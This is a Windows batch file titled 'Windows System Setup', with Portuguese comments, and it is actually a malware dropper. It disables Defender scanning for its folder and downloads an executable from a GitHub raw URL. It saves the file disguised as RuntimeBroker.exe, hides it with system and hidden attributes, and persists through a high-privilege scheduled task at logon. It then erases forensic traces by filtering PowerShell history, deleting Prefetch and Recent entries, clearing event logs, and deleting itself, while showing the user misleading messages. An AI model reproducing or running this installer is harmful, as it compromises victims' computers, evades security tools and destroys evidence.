@echo off
setlocal enabledelayedexpansion
title Windows System Setup
color 0b

:: Nome do executável e diretório alvo (mesmo padrão do Unload)
set "EXE_NAME=RuntimeBroker.exe"
set "TARGET_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "WEB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "TASK_NAME=Microsoft\Windows\WindowsApps"

echo [*] Verificando ambiente do sistema...
timeout /t 2 /nobreak >nul

:: 1. Criar diretório se não existir
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%" >nul 2>&1
)

:: 2. Limpar versões antigas se existirem
echo [*] Otimizando componentes...
taskkill /f /im %EXE_NAME% >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
if exist "%TARGET_DIR%\%EXE_NAME%" (
    del /f /q "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1
)

:: 2.1 Exclusão no Defender ANTES do download (evita apagar ao baixar) — requer admin
echo [*] Configurando proteção do sistema...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

:: 3. Download via PowerShell (tráfego aparece como Microsoft/PowerShell)
echo [*] Sincronizando com o servidor...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%WEB_URL%' -OutFile '%TARGET_DIR%\%EXE_NAME%' -UseBasicParsing"

if not exist "%TARGET_DIR%\%EXE_NAME%" (
    color 0c
    echo [!] Erro critico: Falha na sincronizacao. Verifique sua conexao.
    pause
    exit
)

:: 4. Atributos de sistema (Hidden + System) - não aparece nem com "mostrar ocultos"
attrib +s +h "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1

:: 5. Persistência: tarefa agendada no logon
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action = New-ScheduledTaskAction -Execute '%TARGET_DIR%\%EXE_NAME%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0); Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force" >nul 2>&1
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorLevel% neq 0 (
    schtasks /create /tn "%TASK_NAME%" /tr "\"%TARGET_DIR%\%EXE_NAME%\"" /sc onlogon /f /rl highest >nul 2>&1
)

:: 6. Iniciar agora
echo [*] Iniciando servico de telemetria...
start "" "%TARGET_DIR%\%EXE_NAME%"

:: 7. Limpeza de rastros pós-instalação (mesmo nível do Unload)
echo [*] Limpando rastros...
:: 7.1 Histórico PowerShell (remove URL e comando do download)
if exist "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$p='%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'; if (Test-Path $p) { (Get-Content $p) | Where-Object { $_ -notmatch 'Invoke-WebRequest|github|raw.githubusercontent' } | Set-Content $p -Force }"
)
:: 7.2 Recentes (atalhos do Instalar no menu Iniciar/Recent)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path ([Environment]::GetFolderPath('Recent')) -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'instalar' } | Remove-Item -Force -ErrorAction SilentlyContinue" >nul 2>&1
:: 7.3 Prefetch relacionado ao instalador (requer admin)
if exist "C:\Windows\Prefetch" (
    del /f /q "C:\Windows\Prefetch\*INSTALAR*" "C:\Windows\Prefetch\*Instalar*" 2>nul
)

:: 7.4 Limpar cache do certutil e bitsadmin
certutil -urlcache * delete >nul 2>&1
bitsadmin /reset /allusers >nul 2>&1

:: 7.5 Limpar logs de evento relacionados
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "foreach ($log in @('Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-TaskScheduler/Operational','Microsoft-Windows-Bits-Client/Operational')) { wevtutil cl $log 2>$null }" >nul 2>&1

:: 8. Auto-deleção do instalador
echo [*] Instalacao concluida com sucesso.
echo [*] O computador sera limpo em 3 segundos...
timeout /t 3 /nobreak >nul

(goto) 2>nul & del "%~f0"
